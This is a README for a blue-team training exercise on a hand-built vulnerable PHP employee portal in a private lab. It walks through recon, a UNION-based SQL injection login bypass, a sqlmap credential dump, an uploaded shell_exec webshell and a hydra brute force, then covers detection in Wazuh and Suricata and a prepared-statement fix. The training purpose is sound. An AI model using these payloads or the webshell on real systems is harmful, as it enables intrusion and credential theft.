# Exercise 02 – Login Bypass, SQL Injection and a Webshell on the Hidden Portal

A full "zero to fixed" blue team exercise against a **hand-written** vulnerable
app, not a known training tool. Until 2026-10-21 this exercise ran against
DVWA; it's been rebuilt from scratch as a small, realistic "Northgate
Employee Portal" instead, because a well-known CTF app never quite felt like
a real target, and DVWA's single-use CSRF token fought every attack tool
thrown at it (`hydra`, `sqlmap`) the whole way through this project. The
portal has none of that friction – and, as a bonus the rebuild wasn't even
planned around, it turns up a genuinely interesting, honest gap in what gets
detected and what doesn't. The attack side below is a **hands-on
walkthrough, not a script** – every command is something you type yourself.
Every command and every line of output below was actually run against the
lab to produce this document – the alert IDs, rule IDs, IRIS alert numbers
and scan result are real, not illustrative.

## The scenario

**Vulnerability:** the hidden portal at `/legacy/` is a small, genuinely
hand-written PHP app – an internal "Employee Portal" nobody ever finished
securing. Its login query is built by string concatenation
(`"...WHERE username='$u' AND password='$p'"`), vulnerable to a classic SQL
injection auth bypass; it also accepts the login via a plain `GET` request
(so a crafted URL works too, not just the form); the one seeded account has
a weak, guessable password on top of that; and once logged in, the "submit a
document" feature accepts any file type with no checks at all. No CSRF
token anywhere – an app this old and unmaintained never got one.

**Root cause, in the fictional sysadmin's own words:** "Someone on the old
IT team threw this together years ago so people could submit timesheets
without emailing them around. It still works, so nobody's touched it since."
A small, forgotten, never-reviewed internal tool is exactly the kind of
thing real engagements find – more so than a dedicated, well-known training
app ever quite manages to feel like.

## Roles

- **Red cell / instructor:** runs `enable-vulnerability.sh` on `target`
  (this one setup step is scripted – it's building the lab, not attacking
  it), then works through Step 2 below on `kali` by hand, without telling
  the trainee what was done.
- **Blue team / trainee:** only looks at Wazuh (and later Greenbone) to
  figure out what happened, then fixes it.

## Step 1 – Red cell: make sure the vulnerability is on

There's no synced folder into the VMs, so upload the script first, then run
it inside the VM:

```bash
vagrant upload exercises/02-portal-sqli/enable-vulnerability.sh /tmp/enable-vulnerability.sh target   # on the host
vagrant ssh target                                                                                     # on the host
sudo bash /tmp/enable-vulnerability.sh                                                                 # inside the VM
```

This is usually a no-op – `provision/target/install.sh` already ships the
portal this way. It exists so the exercise works even if this exercise's own
`fix.sh` has already run on this box.

## Step 2 – Red cell: attack it by hand

Everything from here on is typed directly into a `kali` shell
(`vagrant ssh kali`) – no wrapper script runs this for you.

**2a. Recon – confirm what's listening, then find the hidden app:**

```bash
nmap -sV -p80 10.10.20.10
gobuster dir -u http://10.10.20.10/ -w /usr/share/wordlists/dirb/common.txt -q
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

legacy               (Status: 301) [Size: 311] [--> http://10.10.20.10/legacy/]
```

**2b. A single, hand-crafted bypass attempt – and a first honest surprise.**
The login query is injectable, so this should get you in without knowing the
password:

```bash
curl -s -G http://10.10.20.10/legacy/login.php \
     --data-urlencode "username=' UNION SELECT 1,'admin','x'-- -" \
     --data-urlencode 'password=x' -o /dev/null -w '%{http_code}\n'
```

```
302
```

It works – `302` means you're logged in. But check Wazuh after this one
request (see Step 3) and you'll find it's almost invisible: a single level-7
log-based hit, nowhere near the level-10 threshold that forwards to IRIS,
and Suricata doesn't flag it at all. One well-crafted, one-shot request can
genuinely slip through – a real, honest gap in this detection stack, not a
staged one.

**2c. The same bug, properly automated – a very different story:**

```bash
sqlmap -u "http://10.10.20.10/legacy/login.php?username=admin&password=x" \
       --batch --level=1 --risk=1 --technique=BU --dump -D portal -T users
```

```
Database: portal
Table: users
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 2  | Welcome1 | admin    |
+----+----------+----------+
```

`sqlmap` found and confirmed the injection, then dumped the real
credentials, in under a second – and, unlike going after this same class of
bug on DVWA earlier in this project, it never hung. This run alone fires off
a dozen-plus alerts across Suricata *and* Wazuh's own correlation rules (see
Step 3) – the detection gap in 2b is specific to one quiet, manual request,
not a blanket miss for the whole vulnerability class.

**2d. Log in for real and drop a webshell through the upload:**

```bash
curl -s -c /tmp/c.txt -X POST http://10.10.20.10/legacy/login.php \
     -d 'username=admin&password=Welcome1'

cat > /tmp/shell.php <<'PHP'
<?php
echo "<pre>Northgate portal shell\n";
echo shell_exec($_GET['c'] ?? 'id');
echo "</pre>";
PHP

curl -s -b /tmp/c.txt -F 'document=@/tmp/shell.php' \
     http://10.10.20.10/legacy/dashboard.php
curl -s 'http://10.10.20.10/legacy/uploads/shell.php?c=whoami'
```

```
<p>Uploaded: shell.php</p>
<pre>Northgate portal shell
www-data
</pre>
```

Full remote code execution, the same lesson exercise 01 teaches, through a
different door this time.

**2e. Or skip the SQLi entirely and just brute-force the real password** –
the login takes `GET` *and* `POST`, and with no CSRF token to fight, `hydra`
needs no workaround, no custom script, nothing:

```bash
printf '123456\nadmin\nletmein\nqwerty\nWelcome1\nchangeme\n' > /tmp/pw.txt
hydra -l admin -P /tmp/pw.txt 10.10.20.10 http-post-form \
      '/legacy/login.php:username=^USER^&password=^PASS^:F=Login failed'
```

```
[80][http-post-form] host: 10.10.20.10   login: admin   password: Welcome1
1 of 1 target successfully completed, 1 valid password found
```

## Step 3 – Blue team: find it in Wazuh

Open the Wazuh dashboard (`https://localhost:8444`) → **Discover**, with the
`wazuh-alerts-*` index pattern selected. In this real run, the picture
changes completely depending on *how* the login was attacked:

| Step | Source | Rule | Level | What it tells you |
|---|---|---|---|---|
| 2b (one manual request) | Apache access log (Wazuh's own `web_rules.xml`) | `31103` – *"SQL injection attempt"* | 7 | Logged, visible if you go looking – but **below the level-10 auto-forward threshold**, and Suricata raised nothing for this one request at all. |
| 2c (`sqlmap`) | Suricata (ET Open) | `100100` – *"Suricata [high]"*, several different signatures (`SELECT CAST`, `Information Schema Access`, `ATTACKER SQLi`, …) | 12 | A tool doing real automated SQLi testing matches several independent signatures, not just one. |
| 2c (`sqlmap`) | Suricata | `100101` – *"ET SCAN Sqlmap SQL Injection Scan"* | 10 | Suricata fingerprints the **tool itself**, separately from the technique. |
| 2c (volume) | Wazuh correlation | `100110` – *"Possible network scan"* / `31151`/`31152` family | 10 | `sqlmap`'s request volume alone trips the existing frequency-based correlation rules. |
| 2d (upload) | File-integrity monitoring | `554` – *"File added to the system"* | 5 | `/var/www/html/legacy/uploads/shell.php` appears, owned by `www-data`. |
| 2d (upload) | Suricata | `100100`, three separate signatures (*"PHP tags in HTTP POST"*, *"Suspicious PHP Code in HTTP POST"*, *"SQL Injection (exec) in HTTP Request Body"*) | 12 | The webshell's own source code (`shell_exec`, `<?php`) matches generic code-injection signatures, independent of FIM. |
| 2e (`hydra`) | Apache access log (custom rule, chained onto the same family that already exists for the main README's DVWA-era login brute force) | `100129` → `100130` | 3 → 10 | The exact same request-volume correlation already built earlier in this project – reused as-is, no new rule needed, since it just matches POSTs to `/legacy/login.php`. |

Every row except the first forwards automatically to **DFIR-IRIS**
(`https://localhost:8445`) – in this real run, alerts landed as #5915,
#5949-5951, #6086-6088 and more, across the different detection paths.
Escalate any of them into a case there to document the investigation.

**The honest finding worth sitting with:** a single, well-crafted SQLi
request genuinely can slip past this entire stack almost unnoticed (Step
2b). It's only the *pattern* of automated, repeated probing – the way a real
attacker's tooling actually behaves in practice – that lights everything up.
That's a realistic, not a staged, limitation: a skilled, patient attacker
making one quiet, correct guess is a categorically harder problem for a SOC
than the loud, automated scanning Step 2c demonstrates.

## Step 4 – Blue team: confirm with Greenbone

Open Greenbone (`https://localhost:9392`) → **Scans → Reports** and look at
a scan of `target` run while this exercise's vulnerability was live. Like
exercise 02's DVWA-era predecessor, **there is no finding here at all** for
the login bypass or the unrestricted upload. The reasoning is the same as
before: these are application-specific business-logic flaws in a page
Greenbone has never seen – it has no way to know `/legacy/login.php`'s
`username` field is unsafe, or that `/legacy/dashboard.php` accepts any file
type, the same way it couldn't fingerprint DVWA's dedicated SQLi page
either. A vulnerability scanner is the wrong tool for this job, full stop –
confirming this one took a human reading the Suricata/Wazuh alerts and
verifying the request by hand, exactly as Step 2 did.

## Step 5 – Blue team: fix it

```bash
vagrant upload exercises/02-portal-sqli/fix.sh /tmp/fix.sh target   # on the host
vagrant ssh target                                                  # on the host
sudo bash /tmp/fix.sh                                                # inside the VM
```

This replaces the login query with a **prepared statement** (a real code
fix, not a config toggle) and adds a file-extension allowlist
(`jpg`/`jpeg`/`png`/`pdf`/`docx`/`txt`) to the upload. Re-run Step 2's
commands afterwards to confirm:

```
--- SQLi bypass attempt ---
200   (stays on the login page - "Login failed")
--- legitimate login ---
302   (admin / Welcome1 still works fine)
--- uploading the same shell.php ---
Rejected: file type .php is not allowed.
```

That's the loop closed: *vulnerable* → *exploited two different ways* →
*detected, with an honest gap documented, not hidden* → *scanner can't
confirm it either, same honest limitation* → *fixed with real code changes*
→ *verified fixed by re-running the exact same attacks*.

## Files in this exercise

| File | Runs on | Purpose |
|---|---|---|
| `enable-vulnerability.sh` | `target` | Writes the vulnerable `login.php`/`dashboard.php` (idempotent, reversible). This is environment setup, so it's scripted – the attack in Step 2 deliberately isn't. |
| `fix.sh` | `target` | Remediation: prepared statement + upload allowlist. |

## Why this design (and what it deliberately isn't)

This exercise is a deliberate departure from using a known training app: a
small, hand-written portal means every vulnerability is something I built
and fully understand, with no CSRF-token friction fighting the very tools
the exercise asks you to use. It wasn't built around the detection story
documented above – that story is what actually happened when the real
tools were pointed at it, including the uncomfortable parts (a single
clean SQLi request really does slip through). Keeping that honest, rather
than quietly picking a louder payload to get a tidier writeup, is exactly
the standard the rest of this project tries to hold itself to.
